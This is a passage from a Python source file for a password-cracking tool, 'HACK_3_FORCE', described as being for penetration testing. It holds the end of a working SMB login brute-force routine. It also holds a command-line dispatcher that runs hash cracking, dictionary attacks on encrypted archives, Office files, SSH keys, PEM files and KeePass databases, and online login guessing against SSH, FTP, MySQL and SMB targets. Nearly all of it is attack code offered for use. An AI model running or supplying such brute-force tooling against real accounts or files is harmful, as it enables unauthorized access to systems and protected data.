                    conn = SMBConnection(username, password, "hackforce-client", target_ip, use_ntlm_v2=True)
                    connected = conn.connect(target_ip, 139, timeout=timeout)
                    if connected:
                        if verbose:
                            print(f"{Colors.OKGREEN}[+] SMB login successful: {username}:{password}{Colors.ENDC}")
                        conn.close()
                        return username, password
                    else:
                        if verbose:
                            print(f"{Colors.FAIL}[-] SMB login failed for {username}:{password} ({idx}/{len(pass_list)}){Colors.ENDC}")
                        break
                except (socket.timeout, socket.error) as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] Connection error on attempt {attempts+1}: {e}{Colors.ENDC}")
                    attempts += 1
                    time.sleep(1)
                except Exception as e:
                    if verbose:
                        print(f"{Colors.WARNING}[!] Unexpected SMB error: {e}{Colors.ENDC}")
                    break
            if attempts == 3 and verbose:
                print(f"{Colors.WARNING}[!] Skipping password {password} after 3 failed connection attempts.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Finished all passwords for user {username} without success.{Colors.ENDC}")
    return None, None

def main():
    parser = argparse.ArgumentParser(description="HACK_3_FORCE - Advanced Modular Brute Force Tool for Penetration Testing")
    parser.add_argument('--at_mode', type=int, choices=[1,2,3], default=1,
                        help='at_mode of operation: 1=hash crack (like Hashcat), 2=hash file crack (like JTR), 3=network crack (like Hydra)')
    parser.add_argument('--hash', help='Target hash to crack (at_mode 1)')
    parser.add_argument('--type', default='md5', help='Hash type (md5, sha1, sha256, sha512, ntlm, bcrypt, bcrypt-passlib, md5-crypt, sha256-crypt, sha512-crypt, argon2, ripemd160, whirlpool, sha3_256, sha3_512, md5_salt_pass, md5_pass_salt, sha1_salt_pass, sha1_pass_salt, sha256_salt_pass, sha256_pass_salt, hmac_md5, hmac_sha1, hmac_sha256, hmac_sha512, scrypt)')
    parser.add_argument('--salt', help='Salt value if required by hash type')
    parser.add_argument('--max-length', type=int, default=6, help='Max password length for brute force')
    parser.add_argument('--processes', type=int, default=4, help='Number of parallel processes')
    parser.add_argument('--dictionary', help='Path to dictionary file for dictionary attack (at_mode 1 or 2)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--zip2hack', help='Path to ZIP file to crack (at_mode 2)')
    parser.add_argument('--a7z2hack', help='Path to 7z encrypted archive to crack (at_mode 2)')
    parser.add_argument('--rar2hack', help='Path to RAR file to crack (at_mode 2)')
    parser.add_argument('--a5r2hack', help='Path to RAR5 encrypted archive to crack (at_mode 2)')
    parser.add_argument('--gpg2hack', help='Path to GPG encrypted file to crack (at_mode 2)')
    parser.add_argument('--pdf2hack', help='Path to PDF file to crack (at_mode 2)')
    parser.add_argument('--doc2hack', help='Path to Word document protected to crack (at_mode 2)')
    parser.add_argument('--xls2hack', help='Path to Excel document password protected to crack (at_mode 2)')
    parser.add_argument('--ppt2hack', help='Path to PowerPoint document password protected to crack (at_mode 2)')
    parser.add_argument('--docx2hack', help='Path to DOCX (Open XML) protected document to crack (at_mode 2)')
    parser.add_argument('--xlsx2hack', help='Path to XLSX (Open XML) protected document to crack (at_mode 2)')
    parser.add_argument('--pptx2hack', help='Path to PPTX (Open XML) protected document to crack (at_mode 2)')
    parser.add_argument('--pem2hack', help='Path to encrypted PEM file protected to crack (at_mode 2)')
    parser.add_argument('--spk2hack', help='Path to SSH private key file to crack (password protected) (at_mode 2)')
    parser.add_argument('--kdb2hack', help='Path to KeePass 1.x kdb file protected to crack (at_mode 2)')
    parser.add_argument('--kdbx2hack', help='Path to KeePass 2.x kdbx protected to crack (at_mode 2)')
    parser.add_argument('--show-pass', help='Show cracked password for given file (at_mode 2)')
    parser.add_argument('--user', help='Single username or path to user list file (at_mode 3)')
    parser.add_argument('--password-list', help='Password list file for at_mode 3')
    parser.add_argument('--target-ip', help='Target IP address (at_mode 3)')
    parser.add_argument('--ssh', action='store_true', help='Use SSH protocol (at_mode 3)')
    parser.add_argument('--ftp', action='store_true', help='Use FTP protocol (at_mode 3)')
    parser.add_argument('--mysql', action='store_true', help='Use MySQL protocol (at_mode 3)')
    parser.add_argument('--smb', action='store_true', help='Use SMB protocol (at_mode 3)')
    args = parser.parse_args()

    salt = args.salt if args.salt else None

    if args.at_mode == 1:
        if not args.hash:
            print(f"{Colors.WARNING}[!] Error: --hash is required in at_mode 1{Colors.ENDC}")
            return
        target_hash = args.hash.strip()
        if args.verbose:
            print(f"{Colors.OKCYAN}[*] Starting crack on single hash: {target_hash}{Colors.ENDC}")
        password = None
        if args.dictionary:
            password = dictionary_attack(target_hash, args.type, args.dictionary, salt, args.verbose)
        if password is None:
            password = brute_force_parallel(target_hash, args.type, salt, max_length=args.max_length, processes=args.processes, verbose=args.verbose)
        if password:
            print(f"{Colors.OKGREEN}[+] Cracked password: {password}{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] the cracked password saved in cracked_passwords.log{Colors.ENDC}")
            log_cracked_password(target_hash, password)
        else:
            print(f"{Colors.FAIL}[-] Failed to crack the hash.{Colors.ENDC}")
        return

    elif args.at_mode == 2:
        if args.show_pass:
            show_cracked_passwords(args.show_pass)
            return

        if args.zip2hack:
            if not args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on ZIP file: {args.zip2hack}{Colors.ENDC}")
            password = crack_archive(args.zip2hack, 'zip', args.dictionary, processes=args.processes, verbose=args.verbose)
            if password:
                print(f"{Colors.OKGREEN}[+] Cracked ZIP password: {password}{Colors.ENDC}")
                print(f"{Colors.OKBLUE}[*]the cracked password saved in cracked_passwords.log{Colors.ENDC}")
                log_cracked_password(args.zip2hack, password)
            else:
                print(f"{Colors.FAIL}[-] Failed to crack ZIP password.{Colors.ENDC}")
            return

        if args.rar2hack:
            if not rarfile:
                print(f"{Colors.WARNING}[!] rarfile module not installed, cannot crack RAR files.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on RAR file: {args.rar2hack}{Colors.ENDC}")
            password = crack_archive(args.rar2hack, 'rar', args.dictionary, processes=args.processes, verbose=args.verbose)
            if password:
                print(f"{Colors.OKGREEN}[+] Cracked RAR password: {password}{Colors.ENDC}")
                print(f"{Colors.OKBLUE}[*]the cracked password saved in cracked_passwords.log{Colors.ENDC}")
                log_cracked_password(args.rar2hack, password)
            else:
                print(f"{Colors.FAIL}[-] Failed to crack RAR password.{Colors.ENDC}")
            return

        if args.pdf2hack:
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on PDF file: {args.pdf2hack}{Colors.ENDC}")
            password = crack_archive(args.pdf2hack, 'pdf', args.dictionary, processes=args.processes, verbose=args.verbose)
            if password:
                print(f"{Colors.OKGREEN}[+] Cracked PDF password: {password}{Colors.ENDC}")
                print(f"{Colors.OKBLUE}[*]the cracked password saved in cracked_passwords.log{Colors.ENDC}")
                log_cracked_password(args.pdf2hack, password)
            else:
                print(f"{Colors.FAIL}[-] Failed to crack PDF password.{Colors.ENDC}")
            return

        if args.spk2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --spk2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on SSH private key file: {args.spk2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_ssh_private_key_password(args.spk2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked SSH private key password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.spk2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack SSH private key password.{Colors.ENDC}")
            return

        if args.gpg2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --gpg2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on GPG file: {args.gpg2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_gpg_password(args.gpg2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked GPG password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.gpg2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack GPG password.{Colors.ENDC}")
            return

        if args.a7z2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --a7z2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on 7z archive: {args.a7z2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_7z_password(args.a7z2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked 7z password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.a7z2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack 7z password.{Colors.ENDC}")
            return

        if args.a5r2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --a5r2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on RAR5 archive: {args.a5r2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_rar5_password(args.a5r2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked RAR5 password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.a5r2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack RAR5 password.{Colors.ENDC}")
            return

        if args.doc2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --doc2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on Word document: {args.doc2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_doc_password(args.doc2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked document password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.doc2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack document password.{Colors.ENDC}")
            return

        if args.docx2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --docx2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on DOCX file: {args.docx2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_docx_password(args.docx2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked DOCX password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.docx2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack DOCX password.{Colors.ENDC}")
            return

        if args.xls2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --xls2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on Excel document: {args.xls2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_xls_password(args.xls2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked Excel password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.xls2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack Excel password.{Colors.ENDC}")
            return

        if args.xlsx2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --xlsx2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on XLSX document: {args.xlsx2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_xlsx_password(args.xlsx2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked XLSX password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.xlsx2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack XLSX password.{Colors.ENDC}")
            return

        if args.ppt2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --ppt2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on PowerPoint document: {args.ppt2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_ppt_password(args.ppt2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked PowerPoint password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.ppt2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack PowerPoint password.{Colors.ENDC}")
            return

        if args.pptx2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --pptx2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on PPTX document: {args.pptx2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_pptx_password(args.pptx2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked PPTX password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.pptx2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack PPTX password.{Colors.ENDC}")
            return

        if args.pem2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --pem2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on PEM file: {args.pem2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_pem_password(args.pem2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked PEM password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.pem2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack PEM password.{Colors.ENDC}")
            return

        if args.kdb2hack:
            if not args.dictionary:
                print(f"{Colors.WARNING}[!] Dictionary file is required for --kdb2hack at_mode.{Colors.ENDC}")
                return
            if args.verbose:
                print(f"{Colors.OKCYAN}[*] Starting crack on KeePass kdb file: {args.kdb2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_kdb_password(args.kdb2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked KeePass kdb password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.kdb2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack KeePass kdb password.{Colors.ENDC}")
            return

        if args.kdbx2hack:
            if not args.dictionary:
                    print(f"{Colors.WARNING}[!] Dictionary file is required for --kdbx2hack at_mode.{Colors.ENDC}")
                    return
            if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Starting crack on KeePass kdbx file: {args.kdbx2hack}{Colors.ENDC}")
            with open(args.dictionary, 'r', encoding='latin-1') as f:
                passwords = [line.strip('\r\n') for line in f if line.strip()]
            total = len(passwords)
            for idx, password in enumerate(passwords, 1):
                if args.verbose:
                    print(f"{Colors.OKCYAN}[*] Trying password {idx}/{total}: '{password}'{Colors.ENDC}")
                if try_kdbx_password(args.kdbx2hack, password, args.verbose):
                    print(f"{Colors.OKGREEN}[+] Cracked KeePass kdbx password: {password}{Colors.ENDC}")
                    print(f"{Colors.OKBLUE}[*] The cracked password saved in cracked_passwords.log{Colors.ENDC}")
                    log_cracked_password(args.kdbx2hack, password)
                    return
            print(f"{Colors.FAIL}[-] Failed to crack KeePass kdbx password.{Colors.ENDC}")
            return

    elif args.at_mode == 3:
    	run_mode_3(args)
    	return

if __name__ == "__main__":
    main()
